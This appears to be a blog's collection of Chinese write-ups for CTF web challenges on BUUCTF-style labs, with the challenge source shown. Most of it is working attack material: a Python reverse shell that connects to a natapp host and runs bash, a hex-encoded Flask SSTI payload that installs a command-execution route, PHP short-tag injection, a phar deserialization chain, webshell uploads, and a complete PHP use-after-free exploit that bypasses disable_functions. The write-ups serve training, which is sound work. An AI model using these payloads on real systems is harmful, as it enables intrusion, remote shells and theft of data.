&#x3D;&#x3D; SECRET_KEY: shell &#x3D; request.args.get(&quot;shell&quot;) os.system(shell) res &#x3D; &quot;ok&quot; else: res &#x3D; &quot;Wrong Key!&quot; return res if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080) 可以看到no_one_know_the_manager中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了 但是这个文件是用open打开的，会创建文件描述符。 我们读这个文件描述符中的内容就好了此处可以通过/proc/pid/fd/读取，这个目录包含了进程打开的每一个文件的链接 拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag nmd弹了几个小时终于弹tan出来了 没公网ip，搞了个端口映射后的公网 (23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客 https://natapp.cn/register 把本地的8082端口映射到公网 把这个payload当shell参数的值打进去 python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 然后在Ubuntu里监听8082端口，从根目录里找到flag 泪目 [SWPUCTF 2018]SimplePHP文件上传，但是这个flie参数感觉可以直接文件读取 index.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;base.php&#39;; ?&gt; base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; &lt;div class&#x3D;&quot;container-fluid&quot;&gt; &lt;div class&#x3D;&quot;navbar-header&quot;&gt; &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt; &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt; file.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123; $show-&gt;source &#x3D; $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#39;file doesn\\&#39;t exists.&#39;); &#125; ?&gt; upload_file.php &lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; class.php &lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension &#x3D; end($temp); if(empty($extension)) &#123; &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; return false; &#125; &#125; &#125; ?&gt; class.php &lt;?php class C1e4r &#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str &#x3D; $name; &#125; public function __destruct() &#123; $this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test; &#125; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key &#x3D; $value; &#125; public function _show() &#123; if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123; die(&#39;hacker!&#39;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test &#123; public $file; public $params; public function __construct() &#123; $this-&gt;params &#x3D; array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value &#x3D; $this-&gt;params[$key]; &#125; else &#123; $value &#x3D; &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text &#x3D; base64_encode(file_get_contents($value)); return $text; &#125; &#125; ?&gt; 肯定是用这个函数来读取flag文件，但是没有反序列化的地方 加个新知识 利用phar协议实现反序列化漏洞攻击 漏洞成因 phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作 原理分析 phar的组成 通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only) 下面进行解释一下； 1 .0 a stub 标识作用，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; ，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件； 2 .0 a manifest describing the contents 其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面； 3 .0 the file contents 这里指的是被压缩文件的内容； 4 .0 [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在结尾； C1e4r类中有__destruct(), __destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。 函数中发现了echo，那么要利用echo $this-&gt;test。 show类有__toString(), __toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。 利用$this-&gt;str[&#39;str&#39;]-&gt;source; Test类有__get（） __get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。 利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value)); 利用C1e4r类的__destruct()中的echo this-&gt;test2.触发Show类的__toString()3.利用Show类的this-&gt;test2.触发Show类的__toString()3.利用Show类的content = $this-&gt;str[&#39;str&#39;]-&gt;source4.触发Test类的__get()5.成功利用file_get()`读文件 反序列化结果 &lt;?php class C1e4r &#123; public $test; public $str; &#125; class Show &#123; public $source; public $str; &#125; class Test &#123; public $file; public $params; &#125; $a &#x3D; new C1e4r(); $b &#x3D; new Show(); $c &#x3D; new Test(); $a -&gt;str &#x3D; $b; $b -&gt;str[&#39;str&#39;] &#x3D; $c; $c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;; $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的 $phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象 $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名 $phar-&gt;stopBuffering(); ?&gt; 生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行 看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问 得到flag 小tips：如果phar协议被过滤，可以试试用 compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F; 版本：7.4 + compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F; 版本：都可以 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F; [HarekazeCTF2019]encode_and_encode source &lt;?php error_reporting(0); if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); exit(); &#125; function is_valid($str) &#123; $banword &#x3D; [ &#x2F;&#x2F; no path traversal &#39;\\.\\.&#39;, &#x2F;&#x2F; no stream wrapper &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;, &#x2F;&#x2F; no data exfiltration &#39;flag&#39; ]; $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true; &#125; $body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据 $json &#x3D; json_decode($body, true); #对body变量进行json解码 if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page $page &#x3D; $json[&#39;page&#39;]; $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件 if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过 $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\\n&quot;; &#125; &#125; else &#123; $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;; &#125; &#x2F;&#x2F; no data exfiltration!!! $content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\\&#123;.+\\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代 echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出 [WUSTCTF2020]CV Maker进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置 通过更改头像传个马上去，蚁剑连接就行 这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行 [RootersCTF2019]I_&lt;3_Flaskssti注入，用使用工具Arjun进行参数爆破 然后找到name参数后，拿出珍藏的写入shell的payload ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com) &#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x0a\\x0a\\x40\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x2e\\x72\\x6f\\x75\\x74\\x65\\x28\\x27\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x27\\x2c\\x6d\\x65\\x74\\x68\\x6f\\x64\\x73\\x3d\\x5b\\x27\\x47\\x45\\x54\\x27\\x2c\\x27\\x50\\x4f\\x53\\x54\\x27\\x5d\\x29\\x0a\\x64\\x65\\x66\\x20\\x73\\x68\\x65\\x6c\\x6c\\x28\\x29\\x3a\\x0a\\x20\\x20\\x20\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73\\x0a\\x20\\x20\\x20\\x20\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x0a\\x20\\x20\\x20\\x20\\x63\\x6d\\x64\\x3d\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x61\\x72\\x67\\x73\\x2e\\x67\\x65\\x74\\x28\\x27\\x63\\x6d\\x64\\x27\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x74\\x3d\\x6f\\x73\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x63\\x6d\\x64\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x72\\x74&#39;) %&#125;&#123;% endif%&#125; 其中的16进制编码了原始代码 即 from flask import current_app @current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def shell(): import os from flask import request cmd&#x3D;request.args.get(&#39;cmd&#39;) rt&#x3D;os.popen(cmd).read() return rt 写入 然后直接写入命令 可能会出现not found的报错，多试几次 [CISCN2019 华东南赛区]Double Secret 有/secret目录，扫一下或者猜出来 arjun扫一下是否有传参 当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码 采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去 能找到根目录下的flag.txt cat读取 这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了 从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com) [红明谷CTF 2021]write_shell&lt;?php error_reporting(0); highlight_file(__FILE__); function check($input)&#123; if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123; &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123; die(&#39;hacker!!!&#39;); &#125;else&#123; return $input; &#125; &#125; function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key&#x3D;&gt;$output)&#123; $input[$key] &#x3D; waf($output); &#125; &#125;else&#123; $input &#x3D; check($input); &#125; &#125; $dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;; if(!file_exists($dir))&#123; mkdir($dir); &#125; switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#39;pwd&#39;: echo $dir; break; case &#39;upload&#39;: $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); &#125; ?&gt; 过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\\t PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\\t&#x2F;&#96;?&gt; ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;flllllll1112222222lag&#96;?&gt; 或者 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;f*&#96;?&gt; *为通配符 [GYCTF2020]EasyThinking题目时thinkphp6版本的漏洞 ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com) 只需要构造 PHPSESSID 的值即可，值为 string&amp;&amp;长度为 32 此时查看一下生成的 session，生成的 session 文件保存在 \\runtime\\session 下 session 里的内容: a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125; 可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell 这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂 所以我们可以修改session为.php的后缀，然后 在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马 先试试phpinfo /runtime/session/sess_0123456789012345678901234568.php 写个一句话木马 蚁剑连接 根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容 但是在虚拟终端无法执行命令 结合phpinfo里的禁用函数 能得出这是个突破disable_function限制执行命令的考点 之前[极客大挑战 2019]RCE ME也有这个考点（往上翻 但是在这道题里用蚁剑的插件没法绕过 上个exp（羡慕能写出这种exp的大师傅 &lt;?php pwn(&quot;&#x2F;readflag&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p + $j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i &#x3D; 0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if ($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if (!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if ($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if ($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while ($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if (stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for ($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if (!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if (!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if (!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; 把这个php文件找个地方传上去 访问这个路径，得到flag [BJDCTF2020]EzPHP这个题质量好高 中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php 访问这个页面 &lt;?php highlight_file(__FILE__); error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;; $shana &#x3D; $_GET[&#39;shana&#39;]; $passwd &#x3D; $_GET[&#39;passwd&#39;]; $arg &#x3D; &#39;&#39;; $code &#x3D; &#39;&#39;; echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; if($_SERVER) &#123; if ( preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;]) ) die(&#39;You seem to want to do something bad?&#39;); &#125; if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123; if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; $file &#x3D; $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value)) die(&#39;fxck you! I hate English!&#39;); &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;); if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;; &#125; else&#123; die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;); &#125; if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\&#96;|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#39;|\\&#x3D;|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^&#x2F;i&#39;, $arg) ) &#123; die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#39;&#39;, $arg); &#125; ?&gt; 过滤了一堆东西 首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行 这里可以用换行符%0a绕过preg_match的匹配 这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行 这个要用data://伪协议就行 常见的数组绕过 最后这也是最重要的地方 